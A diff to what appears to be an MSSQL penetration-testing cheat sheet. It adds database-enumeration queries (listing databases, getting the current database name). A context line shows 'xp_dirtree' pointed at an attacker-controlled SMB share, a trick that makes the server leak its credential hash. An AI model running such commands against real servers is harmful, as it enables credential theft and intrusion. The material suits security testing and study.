@@ -52,6 +52,20 @@ xp_dirtree \\$ATTACKER_IP\fake\share
 SELECT name, database_id, create_date FROM sys.databases;
 ```
 
+```sql
+SELECT STRING_AGG(name, ', ') FROM master..sysdatabases;
+```
+
+Get current DB name:
+---
+```sql
+SELECT DB_NAME();
+```
+
+```sql
+SELECT DB_NAME(N); — for N = 0,1,2,3;
+```
+
 **List tables in selected DB:**
 ---
 #mssql 
